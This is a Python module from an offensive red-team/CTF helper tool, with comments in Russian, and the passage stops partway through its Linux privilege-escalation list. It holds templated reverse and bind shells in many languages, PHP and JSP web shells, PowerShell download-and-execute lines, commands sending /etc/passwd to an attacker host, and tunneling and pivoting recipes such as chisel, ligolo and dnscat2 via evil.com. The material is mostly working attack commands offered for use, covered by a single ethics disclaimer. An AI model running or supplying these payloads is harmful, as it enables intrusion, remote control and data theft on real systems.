"""
Pivot / Post-Exploitation Helpers Pro.
Author: idqwixxa

Генераторы для CTF / лабораторий / red team:
    ─── Reverse shells ───
    - 40+ one-liners (bash, python2/3, perl, php, ruby, nc, socat, awk,
      lua, go, node, java, powershell, msfvenom, xterm, telnet, …)
    - Base64 / UTF-16LE / gzip+base64 / env-var variants

    ─── Bind shells ───
    - 10+ one-liners для Linux/Windows

    ─── Shell stabilization (TTY) ───
    - python PTY, script, socat, rlwrap, stty raw -echo recipe

    ─── File transfer ───
    - HTTP (python/php), base64, nc push/pull, socat, SMB (impacket),
      FTP one-liner, TFTP, BITS, certutil, PowerShell (WebClient/IEX),
      curl, wget, /dev/tcp trick

    ─── Pivoting / tunneling ───
    - SSH (-L, -R, -D, -J), socat, chisel, ligolo, sshuttle, proxychains,
      dnscat2, ptunnel, netsh portproxy, meterpreter autoroute, rpivot

    ─── Port forwarding ───
    - ssh -L, netsh, socat, ssh -R

    ─── Linux privesc (60+) ───
    - SUID/SGID/capabilities/cron/sudo/PATH/NFS/docker/lxd/systemd
    - GTFOBins, kernel CVEs, PwnKit, Dirty Pipe, OverlayFS

    ─── Windows privesc (40+) ───
    - whoami, privileges, services, unquoted path, AlwaysInstallElevated,
      Saved creds, Wi-Fi profiles, unattend, SAM/SYSTEM, PrintSpoofer,
      GodPotato, JuicyPotato, DLL Hijacking, PowerUp

    ─── Container escape one-liners ───
    - docker.sock, cgroup v1/v2, hostPath, hostPID, hostPID

    ─── Cloud metadata one-liners ───
    - AWS IMDSv1/IMDSv2, GCP, Azure, DigitalOcean, Oracle

    ─── Credential dumping one-liners ───
    - /etc/shadow, SAM/SYSTEM, lsass, ntds.dit, gMSA, LSA secrets

    ─── Persistence one-liners ───
    - cron, systemd, bashrc, ssh authorized_keys, registry Run, schtasks

    ─── Payload encoding ───
    - base64, hex, URL, XOR, gzip+base64, PowerShell UTF-16LE,
      certutil, PowerShell IEX

    ─── Утилиты ───
    - Search по всем категориям
    - Export: TXT / Markdown / JSON / bash-script
    - Tool check (какие локальные утилиты доступны)

⚠ Только для этичного использования и CTF / лабораторий.
"""
import json
import re
import shutil
import subprocess
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table

from core.config import config, REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

PIVOT_DIR = REPORT_DIR / "pivot"
PIVOT_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class PivotFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: PivotFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["pivot", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# Reverse shells (расширенный)
# ===========================================================================

REVERSE_SHELLS = {
    "bash": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "bash (mkfifo)": (
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|'
        'nc {lhost} {lport} >/tmp/f'
    ),
    "bash (read line)": (
        'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; '
        'do $line 2>&5 >&5; done'
    ),
    "bash (196)": (
        '0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196'
    ),
    "sh (udp)": (
        'sh -i >& /dev/udp/{lhost}/{lport} 0>&1'
    ),
    "python3": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python2": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python (pty)": (
        "python3 -c 'import os,pty,socket;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(\"/bin/bash\")'"
    ),
    "perl": (
        'perl -e \'use Socket;$i="{lhost}";$p={lport};'
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        'if(connect(S,sockaddr_in($p,inet_aton($i))))'
        '{open(STDIN,">&S");open(STDOUT,">&S");'
        'open(STDERR,">&S");exec("/bin/sh -i");};\''
    ),
    "perl (no /bin/sh)": (
        'perl -MIO -e \'$p=fork;exit,if($p);'
        '$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");'
        'STDIN->fdopen($c,r);$~->fdopen($c,w);'
        'system$_ while<>;\''
    ),
    "php (exec)": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php (shell_exec)": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php (passthru)": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php (system)": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "system(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php (proc_open)": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
    ),
    "ruby": (
        'ruby -rsocket -e \'exit if fork;'
        'c=TCPSocket.new("{lhost}","{lport}");'
        'while cmd=c.gets;'
        'IO.popen(cmd,"r"){|io|c.print io.read}end\''
    ),
    "ruby (simple)": (
        'ruby -rsocket -e \'f=TCPSocket.open("{lhost}",{lport}).to_i;'
        'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    ),
    "nc (mkfifo)": (
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|'
        'nc {lhost} {lport} >/tmp/f'
    ),
    "nc (-e)": f'nc -e /bin/sh {{lhost}} {{lport}}',
    "nc (openbsd, -c)": f'nc -c /bin/sh {{lhost}} {{lport}}',
    "socat": (
        'socat exec:\'/bin/bash -li\',pty,stderr,setsid,sigint,sane '
        'tcp:{lhost}:{lport}'
    ),
    "socat (no PTY)": (
        'socat tcp-connect:{lhost}:{lport} exec:/bin/sh,pty,stderr'
    ),
    "awk": (
        'awk \'BEGIN {{s="/inet/tcp/0/{lhost}/{lport}";'
        'for(;s|&getline c;close(c))'
        'while(c|getline)print|&s;close(s);}}\''
    ),
    "lua": (
        'lua -e "require(\\"socket\\");'
        'require(\\"os\\");'
        't=socket.tcp();'
        't:connect(\\"{lhost}\\",\\"{lport}\\");'
        't:send(\\"id\\\\n\\");'
        'while true do '
        'local s,status=t:receive();'
        'local f=io.popen(s);'
        'if f then t:send(f:read(\\"*a\\")..\\"\\\\n\\");'
        'f:close() end end"'
    ),
    "go": (
        'echo \'package main;import"os/exec";import"net";'
        'func main(){c,_:=net.Dial("tcp","{lhost}:{lport}");'
        'cmd:=exec.Command("/bin/sh");'
        'cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && '
        'go run /tmp/t.go'
    ),
    "golang (net)": (
        'package main; import ("net";"os/exec";"bufio");'
        'func main(){c,_:=net.Dial("tcp","{lhost}:{lport}");'
        'r:=bufio.NewReader(c);'
        'for { cmd,_:=r.ReadString(\'\\n\');'
        'out,_:=exec.Command("/bin/sh","-c",cmd).CombinedOutput();'
        'c.Write(out) }}'
    ),
    "node.js": (
        "(function(){var net=require(\"net\"),"
        "cp=require(\"child_process\"),"
        "sh=cp.spawn(\"/bin/sh\",[]);"
        "var client=new net.Socket();"
        "client.connect({lport},\"{lhost}\",function(){"
        "client.pipe(sh.stdin);sh.stdout.pipe(client);"
        "sh.stderr.pipe(client);});})();"
    ),
    "java": (
        'r = Runtime.getRuntime();'
        'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};'
        'cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);'
        'p.waitFor()'
    ),
    "powershell": (
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
        'New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}) | '
        'ForEach-Object {$s=$_;$st=$_.GetStream();'
        '[byte[]]$b=0..65535|%{0};'
        'while(($i=$st.Read($b,0,$b.Length)) -ne 0){'
        '$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        '$o=(iex $d 2>&1 | Out-String);'
        '$sb=([text.encoding]::ASCII).GetBytes($o);'
        '$st.Write($sb,0,$sb.Length);$st.Flush()};$_.Close()}'
    ),
    "powershell (b64)": (
        "powershell -nop -w hidden -e <BASE64>"
    ),
    "powershell (IEX WebClient)": (
        "powershell -nop -w hidden -c "
        "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/ps.ps1')"
    ),
    "powershell (ConPtyShell)": (
        "IEX(IWR https://raw.githubusercontent.com/antonioCoco/"
        "ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); "
        "Invoke-ConPtyShell {lhost} {lport}"
    ),
    "cmd (nishang)": (
        "powershell -nop -c \"IEX(New-Object Net.WebClient)."
        "DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1');"
        "Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}\""
    ),
    "xterm (msfvenom style)": (
        'msfvenom -p linux/x64/shell_reverse_tcp '
        'LHOST={lhost} LPORT={lport} -f elf -o rev.elf'
    ),
    "msfvenom (Windows)": (
        'msfvenom -p windows/x64/shell_reverse_tcp '
        'LHOST={lhost} LPORT={lport} -f exe -o rev.exe'
    ),
    "msfvenom (Python)": (
        'msfvenom -p python/meterpreter/reverse_tcp '
        'LHOST={lhost} LPORT={lport} -f raw'
    ),
    "php web shell (POST)": (
        '<?php system($_POST["c"]);?>  # upload as shell.php; '
        'then: curl -d "c=id" http://target/shell.php'
    ),
    "jsp (Tomcat)": (
        '<% Runtime r = Runtime.getRuntime();'
        'Process p = r.exec(request.getParameter("cmd"));'
        '%>'
    ),
    "groovy (Jenkins)": (
        'String host="{lhost}";int port={lport};'
        'String cmd="cmd.exe";'
        'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
        'Socket s=new Socket(host,port);'
        'InputStream pi=p.getInputStream(),pe=p.getErrorStream(),'
        'si=s.getInputStream();'
        'OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
        'while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());'
        'while(pe.available()>0)so.write(pe.read());'
        'while(si.available()>0)po.write(si.read());'
        'so.flush();po.flush();Thread.sleep(50);'
        'try{{p.exitValue();break;}}catch(Exception e){{}}}}'
    ),
}


# ===========================================================================
# Bind shells (расширенный)
# ===========================================================================

BIND_SHELLS = {
    "nc": 'nc -lvnp {lport} -e /bin/bash',
    "nc (mkfifo)": (
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|'
        'nc -l -p {lport} >/tmp/f'
    ),
    "python3": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        "s.bind((\"0.0.0.0\",{lport}));s.listen(1);"
        "c,a=s.accept();"
        "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "socat": (
        'socat TCP-LISTEN:{lport},reuseaddr,fork '
        'EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'
    ),
    "php": (
        "php -r '$s=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);"
        "socket_bind($s,\"0.0.0.0\",{lport});socket_listen($s);"
        "$c=socket_accept($s);while(1){{$i=socket_read($c,1024);"
        "socket_write($c,`$i`);}}'"
    ),
    "perl": (
        'perl -e \'$p={lport};'
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        'setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);'
        'bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);'
        'while($c=accept(C,S)){{open(STDIN,">&C");'
        'open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}}\''
    ),
    "ruby": (
        'ruby -rsocket -e \'s=TCPServer.new({lport});'
        'loop{{c=s.accept;'
        'system("/bin/sh -i <&#{c.fileno} >&#{c.fileno} 2>&#{c.fileno}")}}\''
    ),
    "lua": (
        'lua -e "local s=require(\'socket\');'
        'local t=s.bind(\'*\',{lport});'
        't:listen(1);'
        'while true do '
        'local c=t:accept();'
        'local f=io.popen(\'/bin/sh -i\');'
        'c:send(f:read(\'*a\'));'
        'c:close() end"'
    ),
    "powershell": (
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
        '$l=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{lport});'
        '$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();'
        '[byte[]]$b=0..65535|%{0};$sb=([text.encoding]::ASCII).GetBytes("PS> ");'
        '$s.Write($sb,0,$sb.Length);'
        'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
        '$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        '$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);'
        '$s.Write($sb,0,$sb.Length);$sb=([text.encoding]::ASCII).GetBytes("PS> ");'
        '$s.Write($sb,0,$sb.Length)}'
    ),
    "msfvenom (Windows bind)": (
        'msfvenom -p windows/x64/shell_bind_tcp '
        'LPORT={lport} -f exe -o bind.exe'
    ),
    "msfvenom (Linux bind)": (
        'msfvenom -p linux/x64/shell_bind_tcp '
        'LPORT={lport} -f elf -o bind.elf'
    ),
}


# ===========================================================================
# TTY / Shell stabilization (расширенный)
# ===========================================================================

TTY_UPGRADE = {
    "python PTY": (
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ),
    "python PTY (py2)": (
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ),
    "script": "script -qc /bin/bash /dev/null",
    "script (alt)": "script /dev/null -c bash",
    "socat (shell side)": (
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
        "tcp:{lhost}:{lport}"
    ),
    "После PTY: Ctrl+Z → stty": (
        "# 1. В reverse shell: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
        "# 2. Нажать Ctrl+Z\n"
        "# 3. На своей машине: stty raw -echo; fg\n"
        "# 4. В шелле: export TERM=xterm; export SHELL=/bin/bash\n"
        "# 5. Если не подхватил размер: stty rows 50 cols 200"
    ),
    "rlwrap (клиент)": "rlwrap nc -lvnp {lport}",
    "Проверка TTY": (
        'tty  # должно вернуть /dev/pts/N, а не "not a tty"'
    ),
    "Windows ConPTY": (
        "# Использовать ConPtyShell на Windows-жертве:\n"
        "IEX(IWR https://raw.githubusercontent.com/antonioCoco/"
        "ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); "
        "Invoke-ConPtyShell {lhost} {lport}\n"
        "# На атакующем: stty raw -echo; stty rows 40 cols 150"
    ),
    "Socat PTY полная стабилизация": (
        "# На атакующем:\n"
        "socat file:`tty`,raw,echo=0 tcp-listen:{lport}\n\n"
        "# На цели (если есть socat):\n"
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
        "tcp:{lhost}:{lport}\n"
        "# Если socat нет — скачать статический бинарник:\n"
        "wget http://{lhost}/socat -O /tmp/socat && chmod +x /tmp/socat && "
        "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
    ),
}


# ===========================================================================
# File transfer (расширенный)
# ===========================================================================

FILE_TRANSFER = {
    "Python HTTP server (attacker)": (
        "# На атакующем:\n"
        "python3 -m http.server 8000\n\n"
        "# На цели:\n"
        "wget http://{lhost}:8000/file\n"
        "curl -O http://{lhost}:8000/file"
    ),
    "Python upload server (attacker)": (
        "# На атакующем:\n"
        "python3 -c \"import http.server;"
        "http.server.HTTPServer(('0.0.0.0',8000),"
        "http.server.SimpleHTTPRequestHandler).serve_forever()\"\n\n"
        "# Или: pip install uploadserver && python -m uploadserver 8000\n"
        "# Цель загружает к нам:\n"
        "curl -F 'file=@/etc/passwd' http://{lhost}:8000/upload"
    ),
    "Base64 (small files)": (
        "# На атакующем:\n"
        "base64 -w0 file > file.b64\n\n"
        "# На цели:\n"
        "echo '<paste base64>' | base64 -d > file"
    ),
    "Base64 через /dev/tcp": (
        "# На атакующем — слушаем:\n"
        "nc -lvnp 9000\n\n"
        "# На цели — отправляем base64:\n"
        "base64 -w0 file > /dev/tcp/{lhost}/9000"
    ),
    "Netcat (push)": (
        "# На атакующем (sender):\n"
        "nc -w 3 -q 0 {lhost} 4444 < file\n\n"
        "# На цели (receiver):\n"
        "nc -lvnp 4444 > file"
    ),
    "Netcat (pull)": (
        "# На цели (sender):\n"
        "nc -w 3 -q 0 {lhost} 4444 < file\n\n"
        "# На атакующем (receiver):\n"
        "nc -lvnp 4444 > file"
    ),
    "Socat (reliable)": (
        "# Атакующий (sender):\n"
        "socat -u FILE:file TCP-LISTEN:4444,reuseaddr\n\n"
        "# Цель (receiver):\n"
        "socat -u TCP:{lhost}:4444 OPEN:file,creat"
    ),
    "Certutil (Windows → file)": (
        "certutil -urlcache -split -f http://{lhost}:8000/file.exe "
        "C:\\\\Temp\\\\file.exe"
    ),
    "Certutil (Windows → base64)": (
        "certutil -decode file.b64 file.exe"
    ),
    "Certutil (base64 encode)": (
        "# На Windows-цели — кодируем файл:\n"
        "certutil -encode C:\\\\Temp\\\\file.exe C:\\\\Temp\\\\file.b64\n"
        "# Скопируй содержимое .b64 и декодируй у себя."
    ),
    "PowerShell DownloadFile": (
        "(New-Object System.Net.WebClient).DownloadFile("
        "'http://{lhost}:8000/file.exe','C:\\\\Temp\\\\file.exe')"
    ),
    "PowerShell IEX (in-memory)": (
        "IEX(New-Object Net.WebClient).DownloadString("
        "'http://{lhost}:8000/script.ps1')"
    ),
    "PowerShell DownloadData": (
        "IEX ([System.Text.Encoding]::Unicode.GetString("
        "(New-Object Net.WebClient).DownloadData('http://{lhost}:8000/s.ps1')))"
    ),
    "PowerShell DownloadString (Bypass)": (
        "IEX(IWR -UseBasicParsing http://{lhost}:8000/script.ps1)"
    ),
    "PowerShell Base64 (encoded command)": (
        "# Кодируем команду:\n"
        "PS> $c = 'IEX(IWR http://{lhost}/a.ps1)';"
        "$b = [System.Text.Encoding]::Unicode.GetBytes($c);"
        "[Convert]::ToBase64String($b)\n\n"
        "# Запуск:\n"
        "powershell -nop -w hidden -enc <B64>"
    ),
    "SMB (Windows share → target)": (
        "# Атакующий:\n"
        "impacket-smbserver share /tmp -smb2support\n\n"
        "# Цель (Windows):\n"
        "copy \\\\{lhost}\\share\\file.exe C:\\Temp\\file.exe"
    ),
    "SMB (auth server, обход AV)": (
        "# Атакующий (с паролем):\n"
        "impacket-smbserver share /tmp -smb2support -username u -password p\n\n"
        "# Цель (Windows):\n"
        "net use \\\\{lhost}\\share /user:u p && "
        "copy \\\\{lhost}\\share\\file.exe C:\\Temp\\file.exe"
    ),
    "SMB (target share → attacker)": (
        "# Цель (Windows):\n"
        "net share share=C:\\Temp /grant:everyone,full\n\n"
        "# Атакующий:\n"
        "smbclient //{target_ip}/share -N\n"
        "smb: \\> get file.exe"
    ),
    "FTP (Windows one-liner)": (
        "echo open {lhost} 21> ftp.txt & echo USER anonymous>> ftp.txt & "
        "echo anonymous>> ftp.txt & echo bin>> ftp.txt & "
        "echo GET file.exe>> ftp.txt & echo bye>> ftp.txt & "
        "ftp -v -n -s:ftp.txt"
    ),
    "FTP (Linux)": (
        "ftp -n {lhost} <<EOF\n"
        "user anonymous anonymous\n"
        "binary\n"
        "get file.exe\n"
        "bye\n"
        "EOF"
    ),
    "TFTP (Windows)": (
        "tftp -i {lhost} GET file.exe"
    ),
    "TFTP (Linux)": (
        "tftp {lhost} -c get file"
    ),
    "BITS (Windows, stealth)": (
        "bitsadmin /transfer job /download /priority high "
        "http://{lhost}:8000/file.exe C:\\Temp\\file.exe"
    ),
    "BITS (PowerShell)": (
        "Start-BitsTransfer -Source http://{lhost}:8000/f.exe "
        "-Destination C:\\Temp\\f.exe"
    ),
    "PHP (target → we)": (
        "# Цель (upload):\n"
        "curl -F 'file=@/etc/passwd' http://{lhost}:8000/upload\n\n"
        "# Атакующий (receiver):\n"
        "python3 -c \"from http.server import *; ...\"  # или simple uploader"
    ),
    "Wget (Windows)": (
        "wget.exe http://{lhost}:8000/file.exe -O C:\\Temp\\file.exe"
    ),
    "Wget (Linux, no output)": (
        "wget -q http://{lhost}:8000/file -O /tmp/f && chmod +x /tmp/f"
    ),
    "curl (Windows, in-memory)": (
        "curl -o C:\\Temp\\f.exe http://{lhost}:8000/f.exe && C:\\Temp\\f.exe"
    ),
    "Docker cp (if docker.sock readable)": (
        "# Если у нас RCE в контейнере с доступом к docker.sock:\n"
        "docker cp /etc/passwd host_container:/tmp/passwd\n"
        "# Или через --privileged: docker run -v /:/mnt alpine cat /mnt/etc/passwd"
    ),
    "K8s kubectl cp": (
        "# Если есть SA-token и kubectl:\n"
        "kubectl cp /etc/passwd pod-name:/tmp/passwd"
    ),
}


# ===========================================================================
# Pivoting (расширенный)
# ===========================================================================

PIVOTING = {
    "SSH local forward (-L)": (
        "# Проброс LOCAL:PORT → TARGET:PORT через SSH-сервер\n"
        "ssh -L 8080:internal.host:80 user@{ssh_host}\n"
        "# Теперь http://localhost:8080 → internal.host:80"
    ),
    "SSH remote forward (-R)": (
        "# Проброс с удалённой машины к нам\n"
        "ssh -R 8080:internal.host:80 user@{ssh_host}\n"
        "# Теперь на ssh-сервере: localhost:8080 → internal.host:80"
    ),
    "SSH dynamic SOCKS (-D)": (
        "# SOCKS5 proxy на 1080 через SSH-сервер (pivot)\n"
        "ssh -D 1080 -N -f user@{ssh_host}\n"
        "# Настроить proxychains: socks5 127.0.0.1 1080"
    ),
    "SSH jump host (-J)": (
        "ssh -J user1@{jump1},user2@{jump2} user3@{final_host}"
    ),
    "SSH через proxychains": (
        "# /etc/proxychains4.conf:\n"
        "socks5 127.0.0.1 1080\n\n"
        "proxychains4 nmap -sT -Pn target.internal"
    ),
    "Chisel (reverse tunnel)": (
        "# Атакующий (server):\n"
        "chisel server -p 8080 --reverse\n\n"
        "# Жертва (client):\n"
        "./chisel client {lhost}:8080 R:socks\n"
        "# → SOCKS5 прокси на 127.0.0.1:1080"
    ),
    "Chisel (forward port)": (
        "# Атакующий (server):\n"
        "chisel server -p 8080 --reverse\n\n"
        "# Жертва:\n"
        "./chisel client {lhost}:8080 R:8080:internal.host:80\n"
        "# → localhost:8080 → internal.host:80"
    ),
    "Chisel (Windows, exe)": (
        "# Атакующий (Linux):\n"
        "chisel server -p 8080 --reverse\n\n"
        "# Жертва (Windows):\n"
        "chisel.exe client {lhost}:8080 R:socks"
    ),
    "Ligolo-ng": (
        "# Атакующий (proxy):\n"
        "sudo ./proxy -selfcert -laddr 0.0.0.0:11601\n\n"
        "# Жертва (agent):\n"
        "./agent -connect {lhost}:11601 -ignore-cert\n\n"
        "# В proxy:\n"
        "interface_list\n"
        "interface eth0\n"
        "start"
    ),
    "Ligolo-ng (Windows agent)": (
        "# Жертва (Windows):\n"
        "agent.exe -connect {lhost}:11601 -ignore-cert"
    ),
    "socat (relay)": (
        "# Односторонний релей порта:\n"
        "socat TCP-LISTEN:8080,fork,reuseaddr TCP:internal.host:80\n\n"
        "# Полный TCP-релей через цель (если есть shell):\n"
        "socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80"
    ),
    "socat (двойной pivot)": (
        "# На промежуточной машине (M):\n"
        "socat TCP-LISTEN:9999,fork TCP:final.target:80\n\n"
        "# На атакующем через M:\n"
        "socat TCP-LISTEN:8080,fork TCP:{M_ip}:9999"
    ),
    "socat (reverse shell server)": (
        "# Атакующий:\n"
        "socat file:`tty`,raw,echo=0 tcp-listen:{lport}\n\n"
        "# Цель:\n"
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
        "tcp:{lhost}:{lport}"
    ),
    "sshuttle (VPN over SSH)": (
        "sshuttle -r user@{ssh_host} 10.0.0.0/8 172.16.0.0/12\n"
        "# Прозрачный доступ ко всем внутренним сетям"
    ),
    "Meterpreter autoroute": (
        "meterpreter > run autoroute -s 10.0.0.0/8\n"
        "meterpreter > background\n"
        "msf > use auxiliary/server/socks_proxy\n"
        "msf > set SRVPORT 1080\n"
        "msf > run -j"
    ),
    "Port forward через meterpreter": (
        "meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.5\n"
        "# → localhost:8080 = 10.0.0.5:80"
    ),
    "netsh (Windows portproxy)": (
        "# Перенаправление порта на Windows (нужен админ):\n"
        "netsh interface portproxy add v4tov4 "
        "listenaddress=0.0.0.0 listenport=8080 "
        "connectaddress=10.0.0.5 connectport=80\n"
        "netsh interface portproxy show all\n"
        "netsh advfirewall firewall add rule name=pivot dir=in action=allow protocol=TCP localport=8080"
    ),
    "Pivot через RDP": (
        "# Разрешить на Windows (админ):\n"
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n"
        "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\n\n"
        "# Проброс RDP через SSH:\n"
        "ssh -L 3389:internal.win:3389 user@{ssh_host}"
    ),
    "DNS pivot (dnscat2)": (
        "# Сервер (атакующий):\n"
        "ruby dnscat2.rb --dns \"domain=evil.com,host={lhost}\" --no-cache\n\n"
        "# Клиент (жертва):\n"
        "./dnscat2-v0.07-client-x64 evil.com\n\n"
        "# В сервере: session -i 1, затем shell"
    ),
    "ICMP pivot (ptunnel)": (
        "# Сервер (промежуточная, нужен root):\n"
        "ptunnel -p proxy.target -lp 8000 -da internal.host -dp 80\n\n"
        "# Клиент:\n"
        "ptunnel -p {lhost} -lp 8080 -da internal.host -dp 80"
    ),
    "Proxychains + nmap (TCP connect)": (
        "proxychains4 nmap -sT -Pn -p 22,80,443 target.internal"
    ),
    "Proxychains + curl": (
        "proxychains4 curl http://internal.host/admin"
    ),
    "Proxychains + sqlmap": (
        "proxychains4 sqlmap -u http://internal.host/?id=1 --batch"
    ),
    "Metasploit route через сессию": (
        "msf > route add 10.0.0.0/8 1\n"
        "# где 1 — номер meterpreter-сессии"
    ),
    "rpivot (reverse SOCKS)": (
        "# Атакующий:\n"
        "python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0\n\n"
        "# Жертва:\n"
        "python client.py --server-ip {lhost} --server-port 9999"
    ),
    "gost (SOCKS5 forward)": (
        "# Атакующий:\n"
        "./gost -L=socks5://:1080\n\n"
        "# Проксирование через цель:\n"
        "./gost -L=tcp://:8080/internal.host:80 -F=..."
    ),
    "Cloudflare tunnel": (
        "# Атакующий:\n"
        "cloudflared tunnel --url tcp://localhost:1080\n\n"
        "# Экзотический pivot, обходит egress filtering"
    ),
    "Nginx stream proxy": (
        "# На промежуточной машине /etc/nginx/nginx.conf:\n"
        "stream {\n"
        "    server {\n"
        "        listen 8080;\n"
        "        proxy_pass internal.host:80;\n"
        "    }\n"
        "}\n"
        "sudo systemctl reload nginx"
    ),
}


# ===========================================================================
# Linux privesc (расширенный)
# ===========================================================================

LINUX_PRIVESC = {
    # ── Recon ──
    "System info": (
        "uname -a; cat /etc/os-release; cat /proc/version; "
        "hostname; id; whoami; groups"
    ),
    "Users": (
        "cat /etc/passwd | grep -v nologin | grep -v false"
    ),
    "Sudo -l": "sudo -l",
    "Sudo версия (CVE-2021-3156)": "sudo --version | head -3",
    "Env": "env; set",
    "PATH": "echo $PATH | tr ':' '\\n'",
    "Groups": "id; groups; cat /etc/group",
    "Home dirs": "ls -la /home /root 2>/dev/null",

    # ── SUID / SGID / Capabilities ──
    "SUID бинарники": "find / -perm -u=s -type f 2>/dev/null",
    "SGID бинарники": "find / -perm -g=s -type f 2>/dev/null",
    "SUID+SGID": "find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2>/dev/null",
    "Capabilities": "getcap -r / 2>/dev/null",
    "SUID writable by current user": (
        "find / -perm -u=s -type f -writable 2>/dev/null"
    ),

    # ── Cron ──
    "Cron jobs": (
        "cat /etc/crontab; ls -la /etc/cron.*; "
        "crontab -l 2>/dev/null; cat /etc/cron.d/* 2>/dev/null"
    ),
    "Writable cron scripts": (
        "find /etc/cron* -writable -type f 2>/dev/null"
    ),
    "Crontab других юзеров": (
        "ls -la /var/spool/cron/crontabs /var/spool/cron 2>/dev/null"
    ),
    "pspy (мониторинг)": (
        "./pspy64 -pf -i 1000  # ловить временные процессы root"
    ),

    # ── Files / Configs ──
    "Writable files в /etc": "find /etc -writable -type f 2>/dev/null",
    "Writable files в системе": (
